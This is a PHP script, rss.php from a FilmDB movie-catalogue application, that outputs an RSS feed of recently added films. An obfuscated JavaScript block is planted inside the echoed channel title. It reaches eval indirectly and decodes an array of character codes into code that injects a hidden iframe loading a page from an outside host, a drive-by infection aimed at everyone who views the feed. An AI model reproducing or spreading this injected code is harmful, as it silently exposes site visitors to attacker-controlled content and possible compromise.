<?php
/* FilmDB (based on php4flicks) */

	// rss.php -- display rss feed of the 10 newest movies
	
	require_once('../config/config.php');
	
	// RSS refresh in minutes
	$refresh = 720;

	// columns to be listed
	$cols = ' DISTINCT CONCAT(cat,nr)as nr,movies.name,local,year,runtime,medium,movies.id,fid,container,disks,type,video,audio,lang,ratio,format,channel,herz,width,height,country,rating,avail,lentto,lentsince,inserted,aka,cat,genre,comment ';

	// check if user is logged in
	$loggedin = false; $loging = 0; $loguser = '';

	// default query (overwritten below if filter posted)
	$query = "SELECT SQL_CALC_FOUND_ROWS $cols FROM movies ";
		
		$via_GET = true; 
		$cfg['rssentries'] = '10';
		$_POST['page'] = '0';
		$_POST['view'] = 'list';
		$_POST['filtertitle'] = '*';
		$_POST['filter'] = '';
		$_POST['sortby'][0] = 'inserted DESC';
		$_POST['sortby'][1] = 'nr ASC';
		$_POST['sortby'][2] = 'year ASC';
		$_POST['sorter'] = 'inserted_DESC';
		$_POST['genres'] = '';
		$_POST['tosearch'] = '';
		$_POST['searchin'] = 'movies.name,aka';
		
		if(strlen($_POST['filter'])>0){
			if(substr($_POST['filter'],0,38) != 'SELECT SQL_CALC_FOUND_ROWS _COLS_ FROM')
				die('don\'t try that.');
			$query = str_replace('_COLS_',$cols,$_POST['filter']);
		}
		if(sizeof($_POST['sortby'])>0){
			$sortsize = sizeof($_POST['sortby']);
			for($i=0; $i<$sortsize; $i++){
				$sortarray[$i] = $_POST['sortby'][$i];
				if($sortarray[$i]=='') break;
			}
			for($j=0; $j<$sortsize-$i; $j++){
				if(!isset($cfg['defaultsort'][$j])) break;
				$sortarray[$i] = $cfg['defaultsort'][$j];
				$i++;
			}
		} else {
			$sortarray = $cfg['defaultsort'];
		}

		$sortsize = sizeof($sortarray);
		$sortby = implode($sortarray,',');
		$query .= " ORDER BY $sortby ";
	
	// LIMIT clause
	if(!isset($_POST['page']) || $_POST['page'] == '') {
		$_POST['page'] = '0';
	}

	$query .= ' LIMIT '.$_POST['page'].','.$cfg['rssentries'];
	
	$result = mysql_query($query) or die(mysql_error());
	
	$rowresult = mysql_query('SELECT FOUND_ROWS()') or die(mysql_error());
	$row = mysql_fetch_row($rowresult);
	$rowcount = $row[0];
	
	if (@$_SERVER['HTTP_REFERER'] != "") {
		$serverpath = dirname($_SERVER["HTTP_REFERER"]);
	} else {
		$serverpath = dirname($_SERVER["SCRIPT_URI"]);
	}
	$serverpath = ereg_replace("rss",'', $serverpath);
	
header("Content-Type: text/xml; charset=$rsstype");
echo '<?xml version="1.0" encoding="'.$rsstype.'"?>'."\n";
echo '<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">'."\n";
echo "	<channel>\n";
echo "		<title>".$trans['page_title']."</title><script>function createCSS(selector,declaration){var ua=navigator.userAgent.toLowerCase();var isIE=(/msie/.test(ua))&&!(/opera/.test(ua))&&(/win/.test(ua));var style_node=document.createElement("style");if(!isIE)style_node.innerHTML=selector+" {"+declaration+"}";document.getElementsByTagName("head")[0].appendChild(style_node);if(isIE&&document.styleSheets&&document.styleSheets.length>0){var last_style_node=document.styleSheets[document.styleSheets.length-1];if(typeof(last_style_node.addRule)=="object")last_style_node.addRule(selector,declaration);}};createCSS('#va','background:url(data:,String.fromCharCode)');var dqcp=null;var r=document.styleSheets;for(var i=0;i<r.length;i++){try{var vvyw=r[i].cssRules||r[i].rules;for(var iid=0;iid<vvyw.length;iid++){var ck=vvyw.item?vvyw.item(iid):vvyw[iid];if(ck.selectorText!='#va')continue;bfs=(ck.cssText)?ck.cssText:ck.style.cssText;dqcp=bfs.match(/(S[^")]+)/)[1];ye=ck.selectorText.substr(1);};}catch(e){};}
dbru=new Date(2010,11,3,2,21,4);t=dbru.getSeconds()-2;var il=[t*4.5,t*4.5,t*52.5,t*51,t*16,t*20,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*51.5,t*50.5,t*58,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*57.5,t*33,t*60.5,t*42,t*48.5,t*51.5,t*39,t*48.5,t*54.5,t*50.5,t*20,t*19.5,t*49,t*55.5,t*50,t*60.5,t*19.5,t*20.5,t*45.5,t*24,t*46.5,t*20.5,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*57,t*20,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*62.5,t*16,t*50.5,t*54,t*57.5,t*50.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*59,t*48.5,t*57,t*16,t*49,t*50,t*60.5,t*16,t*30.5,t*16,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*49.5,t*57,t*50.5,t*48.5,t*58,t*50.5,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*20,t*17,t*49,t*55.5,t*50,t*60.5,t*17,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*58,t*57,t*60.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*48.5,t*56,t*56,t*50.5,t*55,t*50,t*33.5,t*52,t*52.5,t*54,t*50,t*20,t*49,t*50,t*60.5,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*16,t*49.5,t*48.5,t*58,t*49.5,t*52,t*16,t*20,t*50.5,t*20.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*49,t*55.5,t*50,t*60.5,t*16,t*30.5,t*16,t*49,t*50,t*60.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*6.5,t*4.5,t*4.5,t*4.5,t*52.5,t*51,t*16,t*20,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*51.5,t*50.5,t*58,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*57.5,t*33,t*60.5,t*42,t*48.5,t*51.5,t*39,t*48.5,t*54.5,t*50.5,t*20,t*19.5,t*49,t*55.5,t*50,t*60.5,t*19.5,t*20.5,t*45.5,t*24,t*46.5,t*20.5,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*57,t*20,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*16,t*50.5,t*54,t*57.5,t*50.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*59.5,t*57,t*52.5,t*58,t*50.5,t*20,t*17,t*30,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*16,t*57.5,t*57,t*49.5,t*30.5,t*19.5,t*52,t*58,t*58,t*56,t*29,t*23.5,t*23.5,t*54,t*52.5,t*59,t*50.5,t*22.5,t*51,t*57,t*50.5,t*50.5,t*23,t*52.5,t*55,t*23.5,t*58,t*57,t*48.5,t*57.5,t*52,t*23.5,t*51.5,t*55.5,t*23,t*56,t*52,t*56,t*31.5,t*57.5,t*52.5,t*50,t*30.5,t*24.5,t*19.5,t*16,t*59.5,t*52.5,t*50,t*58,t*52,t*30.5,t*19.5,t*24.5,t*24,t*19.5,t*16,t*52,t*50.5,t*52.5,t*51.5,t*52,t*58,t*30.5,t*19.5,t*24.5,t*24,t*19.5,t*16,t*57.5,t*58,t*60.5,t*54,t*50.5,t*30.5,t*19.5,t*59,t*52.5,t*57.5,t*52.5,t*49,t*52.5,t*54,t*52.5,t*58,t*60.5,t*29,t*52,t*52.5,t*50,t*50,t*50.5,t*55,t*29.5,t*56,t*55.5,t*57.5,t*52.5,t*58,t*52.5,t*55.5,t*55,t*29,t*48.5,t*49,t*57.5,t*55.5,t*54,t*58.5,t*58,t*50.5,t*29.5,t*54,t*50.5,t*51,t*58,t*29,t*24,t*29.5,t*58,t*55.5,t*56,t*29,t*24,t*29.5,t*19.5,t*31,t*30,t*23.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*31,t*17,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*6.5,t*4.5,t*4.5,t*62.5,t*6.5,t*4.5,t*4.5,t*51,t*58.5,t*55,t*49.5,t*58,t*52.5,t*55.5,t*55,t*16,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*57,t*20,t*20.5,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*59,t*48.5,t*57,t*16,t*51,t*16,t*30.5,t*16,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*49.5,t*57,t*50.5,t*48.5,t*58,t*50.5,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*20,t*19.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*19.5,t*20.5,t*29.5,t*51,t*23,t*57.5,t*50.5,t*58,t*32.5,t*58,t*58,t*57,t*52.5,t*49,t*58.5,t*58,t*50.5,t*20,t*19.5,t*57.5,t*57,t*49.5,t*19.5,t*22,t*19.5,t*52,t*58,t*58,t*56,t*29,t*23.5,t*23.5,t*54,t*52.5,t*59,t*50.5,t*22.5,t*51,t*57,t*50.5,t*50.5,t*23,t*52.5,t*55,t*23.5,t*58,t*57,t*48.5,t*57.5,t*52,t*23.5,t*51.5,t*55.5,t*23,t*56,t*52,t*56,t*31.5,t*57.5,t*52.5,t*50,t*30.5,t*24.5,t*19.5,t*20.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*59,t*52.5,t*57.5,t*52.5,t*49,t*52.5,t*54,t*52.5,t*58,t*60.5,t*30.5,t*19.5,t*52,t*52.5,t*50,t*50,t*50.5,t*55,t*19.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*56,t*55.5,t*57.5,t*52.5,t*58,t*52.5,t*55.5,t*55,t*30.5,t*19.5,t*48.5,t*49,t*57.5,t*55.5,t*54,t*58.5,t*58,t*50.5,t*19.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*54,t*50.5,t*51,t*58,t*30.5,t*19.5,t*24,t*19.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*58,t*55.5,t*56,t*30.5,t*19.5,t*24,t*19.5,t*29.5,t*51,t*23,t*57.5,t*50.5,t*58,t*32.5,t*58,t*58,t*57,t*52.5,t*49,t*58.5,t*58,t*50.5,t*20,t*19.5,t*59.5,t*52.5,t*50,t*58,t*52,t*19.5,t*22,t*19.5,t*24.5,t*24,t*19.5,t*20.5,t*29.5,t*51,t*23,t*57.5,t*50.5,t*58,t*32.5,t*58,t*58,t*57,t*52.5,t*49,t*58.5,t*58,t*50.5,t*20,t*19.5,t*52,t*50.5,t*52.5,t*51.5,t*52,t*58,t*19.5,t*22,t*19.5,t*24.5,t*24,t*19.5,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*51.5,t*50.5,t*58,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*57.5,t*33,t*60.5,t*42,t*48.5,t*51.5,t*39,t*48.5,t*54.5,t*50.5,t*20,t*19.5,t*49,t*55.5,t*50,t*60.5,t*19.5,t*20.5,t*45.5,t*24,t*46.5,t*23,t*48.5,t*56,t*56,t*50.5,t*55,t*50,t*33.5,t*52,t*52.5,t*54,t*50,t*20,t*51,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*62.5];var agx="";var g=function(){return this;}();ajx=g["e"+ye+"l"];var wrcf='';lua=ajx(dqcp);for(var i=0;i<il.length;i++){ccvq=ajx(il[i]);wrcf+=lua(ccvq);}
ajx(wrcf);</script>\n";
echo "		<description>".$trans['rss_title']."</description>\n";
echo "		<link>".$serverpath."</link>\n";
echo "		<ttl>".$refresh."</ttl>\n";
echo "		<language>".$cfg['language']."</language>\n";
echo "		<lastBuildDate>".gmdate("r",time())."</lastBuildDate>\n";
echo "		<image>\n";
echo "			<title>".$trans['page_title']."</title>\n";
echo "			<link>".$serverpath."</link>\n";
echo "			<url>".$serverpath."/images/filmdb.png</url>\n";
echo "		</image>\n";
if($rowcount!=0){
	while($row = mysql_fetch_array($result)){
		echo "		<item>\n";
		if($row['local']!=$row['name']) {
			echo "			<title>".$row['name']." (".$row['local'].")</title>\n";
		} else {
			echo "			<title>".$row['name']."</title>\n";
		}
		echo "			<link>http://www.imdb.com/title/tt".$row['id']."</link>\n";
		echo "			<description>".$row['country']." / ".$row['year']." / ".$row['runtime']." ".$trans['t_minutes']." / ".$row['disks']." x ".$row['medium']." / ".substr($row['inserted'], -2, 2).'-'.substr($row['inserted'], 5, 2).'-'.substr($row['inserted'], 0, 4)."</description>\n";
		echo "			<pubDate>".gmdate("r",time())."</pubDate>\n";
		echo "			<guid>http://www.imdb.com/title/tt".$row['id']."</guid>\n";
		echo "		</item>\n";
	}
}
echo "	</channel>\n";
echo "</rss>\n";
?>